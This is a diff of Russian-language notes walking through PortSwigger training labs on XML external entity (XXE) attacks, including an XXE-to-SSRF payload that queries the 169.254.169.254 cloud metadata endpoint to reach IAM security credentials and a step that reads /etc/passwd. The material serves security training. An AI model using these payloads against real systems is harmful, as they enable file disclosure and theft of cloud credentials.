@@ -16,13 +16,22 @@
 7)после этого просто отправить запрос и в ответе придёт /etc/passwd
 
 2. https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-perform-ssrf
+
 те же действия, что и в предыдущей. до пункта 4) 
+
 5)после объявления xml добавить:
+
 '<!DOCTYPE kek [ <!ENTITY res SYSTEM "http://169.254.169.254/"> ]>'
+
 6)заменить product id на &res; отправить запрос, 
+
 7)в ответе придет latest - добавить его к адресу и получим 
+
 '<!DOCTYPE kek [ <!ENTITY res SYSTEM "http://169.254.169.254/latest"> ]> 'и так далее, 
-n+1)в итоге получаем '<!DOCTYPE kek [ <!ENTITY res SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>', что и приведёт нас к ответу.
+
+n+1)в итоге получаем '<!DOCTYPE kek [ <!ENTITY res SYSTEM 
+
+"http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>', что и приведёт нас к ответу.
 
 3. https://portswigger.net/web-security/xxe/lab-xinclude-attack
 те же действия, что и в 1. до пункта 4) 
